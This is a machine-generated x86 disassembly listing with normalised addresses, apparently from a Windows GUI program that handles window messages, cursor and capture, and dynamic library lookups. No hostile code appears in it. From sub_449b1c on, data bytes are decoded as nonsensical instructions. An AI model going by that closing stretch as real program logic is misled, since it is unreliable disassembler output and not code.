mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_4486bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4469a8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44652c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_4469a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44862c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44870c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43d798
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d798
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_448788
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_446438
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4464e4
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_446a8c
test eax eax
je r-xdata
mov eax esi
call sub_4464b0
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_448530
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_446d5c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446a8c
mov edx [ ebx + 0x20 ]
call sub_4469e4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_448788
pop ecx
sub_448808
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_446494
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_446494
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_446a8c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_448808
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_448530
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_446d5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_446690
mov eax edi
call sub_446a80
test eax eax
je r-xdata
mov eax edi
call sub_446a8c
mov esi eax
mov eax esi
call sub_4469a8
push eax
mov eax esi
call sub_4464e4
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_446a80
call sub_4469a8
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_4469a8
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_4469d0
mov eax esi
call sub_4469a8
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4469d0
mov eax edi
call sub_446a8c
call sub_446a20
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4464e4
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4469d0
mov eax edi
call sub_446a80
call sub_446a20
mov bl 0x1
jmp r-xdata
sub_448940
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446cf4
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412988
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4474e8
test eax eax
je r-xdata
push ebp
call sub_448788
pop ecx
push ebp
call sub_448808
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44870c
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_4489c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_446574
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_446574
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4486bc
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4486bc
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_448a58
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448e30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b0c
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4474e8
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44848c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b0c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4474e8
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43d93c
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e37
lea eax [ ebp - 0x48 ]
call sub_404074
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4445f8
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43c658
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43eb10
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404074
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_448940
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_443128
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_448540
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b0c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_4489c8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_448540
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b0c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4474e8
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43dd18
jmp r-xdata
mov eax edi
call sub_45a850
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4474e8
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43d798
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43ddf8
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_4040c8
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44842c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bf50
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4445f8
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43e4b8
jmp r-xdata
sub_448e40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_448fb4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_448ed0
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448f8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_448f34
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_448f64
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406c00
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_448f8c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448f00
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_448fb4
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_448f18
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_448f34
pop ebx
retn
mov eax ebx
call sub_448f64
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_449018
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44917e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44929c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_449280
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_449280
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44938c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032a0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4032a0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4032a0
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4032a0
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404074
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404074
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_449414
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44958c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408dbc
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4040c8
mov eax [ rw-data ]
call sub_404534
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408dbc
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4040c8
mov eax [ rw-data ]
call sub_404534
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404534
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41408c
mov [ rw-data ] eax
call sub_449018
mov dl 0x1
mov eax [ r-xdata ]
call sub_448e40
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45b82c
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c910
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45e4f8
mov ecx r-xdata
mov edx sub_43aeb4
mov eax [ r-xdata ]
call sub_4137ac
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449593
lea eax [ ebp - 0x10 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4495fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44965b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449662
retn
mov eax rw-data
call sub_40d01c
call sub_44938c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404afc
mov eax rw-data
call sub_404074
mov eax rw-data
call sub_404074
sub_449664
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4496ea
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4496f1
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_449414
mov eax [ r-xdata ]
call sub_413620
mov eax [ r-xdata ]
call sub_4136c0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
sub_449b1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esp + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
fwait
inc esp
add [ eax ] dh
add [ eax ] al
add [ eax ] bl
push ds
inc ecx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
sub [ eax + 0x41 ] bl
add [ eax ] bl
inc ebp
inc ecx
add ah bh
dec esp
inc ecx
add ah dh
dec ebx
inc ecx
add al dl
pop edx
inc ecx
add [ ebx + ebx * 2 ] al
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add al ah
dec edi
inc ecx
add [ eax - 0x23ffbea4 ] al
pop esp
inc ecx
add [ eax - 0x5fffbea3 ] dh
push esi
inc ecx
add ah ch
pop ebp
inc ecx
add [ eax + 0x5e ] ah
inc ecx
add [ eax - 0x6fffbb55 ] al
pop eax
inc ecx
add [ ebx + ecx * 2 ] bh
inc ecx
add [ ecx + ebx * 2 ] ch
inc ecx
add [ ecx + ebx * 2 + 0x41 ] ch
add al bl
pop ecx
inc ecx
add [ edi + ecx * 2 + 0x5b680041 ] cl
inc ecx
add [ ecx + edx * 2 + 0x52680041 ] dl
inc ecx
add [ ebx + ebx * 2 + 0x5bb40041 ] ah
inc ecx
add ah cl
push edx
inc ecx
add [ eax ] ah
push ebx
inc ecx
add ah cl
push ebx
inc ecx
add [ ebp + edx * 2 + 0x41 ] ah
add [ ebp + edx * 2 + 0x56500041 ] bh
inc ecx
add ah dh
pop eax
inc ecx
add [ eax ] dl
pop ecx
inc ecx
add [ eax ] cl
pop esp
inc ecx
add [ eax + 0x5a ] bl
inc ecx
add [ eax ] bl
pop esi
inc ecx
add [ eax ] ch
pop esi
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ edx + esi + 0x40 ] dl
inc ebx
jne r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add [ ebp + 0x44 ] bl
add [ ebp - 0x5ba3ffbc ] ch
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffaa900041 ] dh
inc ecx
add [ esi + ebx * 4 + 0x44 ] bh
inc eax
dec esp
imul esi [ ebx + 0x74 ] 0x9c10c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] al
add al [ eax ]
out dx al
add [ eax - 0x56 ] bh
inc esp
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] cl
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x55 ] dl
inc ecx
add ah dh
stosb [ edi ]
inc ecx
add [ eax - 0x47ffbe56 ] cl
stosb [ edi ]
inc ecx
add [ edx + ebp * 4 - 0x602fffbf ] cl
inc esp
add [ eax + 0x380044a8 ] ah
test al 0x44
add [ ebx + ebp * 4 + 0x44 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
xor al 0xa5
inc ecx
inc ebx
jne r-xdata
add [ eax + 0x7c0041aa ] dl
sahf
inc esp
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or [ edi ] bl
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x9c800000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
pushfd
inc esp
add [ eax ] bl
popfd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dh
pushfd
inc esp
add [ ebx * 4 + 0xa00044 ] al
add [ eax ] al
hlt
sub_449cfa
out dx eax
inc esp
stosb [ edi ]
inc esp
add ah ch
stosb [ edi ]
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
sbb [ ebp + 0xd070044 ] bl
push esp
inc ebx
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa30
test bl bl
jle r-xdata
mov edx esi
call sub_44a220
test eax 0xa9a80041
inc ecx
add al bl
test eax 0xa8f80041
inc ecx
add [ ecx + ebp * 4 - 0x561fffbf ] cl
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
add ah dl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ esp + eax * 2 + 0x4497c800 ] 0x0
add eax [ eax ]
or [ ecx + 0x63 ] al
je r-xdata
loopne r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
inc eax
test eax 0xa93c0041
inc ecx
add [ ecx + ebp * 4 + 0x41 ] dh
dec esp
imul esi [ ebx + 0x74 ] 0x9d880000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
inc esp
add [ eax ] bl
